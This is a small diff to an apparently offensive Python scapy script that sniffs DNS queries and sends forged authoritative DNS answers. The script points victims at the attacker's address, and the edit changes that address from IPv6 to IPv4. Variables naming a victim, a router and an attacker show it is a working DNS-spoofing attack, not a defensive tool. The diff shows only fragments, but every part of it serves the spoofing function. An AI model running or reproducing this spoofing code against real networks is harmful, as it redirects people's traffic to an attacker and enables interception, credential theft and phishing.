@@ -1,6 +1,6 @@
 from dotenv import load_dotenv
 import os
-from scapy.all import sniff, send, Ether, IP, IPv6, UDP, DNS, DNSQR, DNSRR, get_if_addr6
+from scapy.all import sniff, send, Ether, IP, IPv6, UDP, DNS, DNSQR, DNSRR, get_if_addr
 #import socket
 #from scapy.all import get_if_hwaddr
 
@@ -8,7 +8,7 @@ load_dotenv()
 victim_ip6 = os.getenv("victim_ip6")
 router_ip6 = os.getenv("router_ip6")
 iface = os.getenv("iface")
-attacker_ip6 = get_if_addr6(iface)
+attacker_ipv4 = get_if_addr(iface)
 #attacker_mac = get_if_hwaddr(iface)
 
 
@@ -35,7 +35,7 @@ def dns_spoof(pkt):
 		IP(dst = pkt[IP].src, src = pkt[IP].dst) /
 		UDP(dport = pkt[UDP].sport, sport = 53) /
 		DNS(id = pkt[DNS].id, qr = 1, aa = 1, qd = pkt[DNS].qd, an =
-	  		DNSRR(rrname = pkt[DNSQR].qname, ttl = 10, rdata = attacker_ip6)
+	  		DNSRR(rrname = pkt[DNSQR].qname, ttl = 10, rdata = attacker_ipv4)
 		)
 	)
 	send(spoofed_pkt, verbose=0)
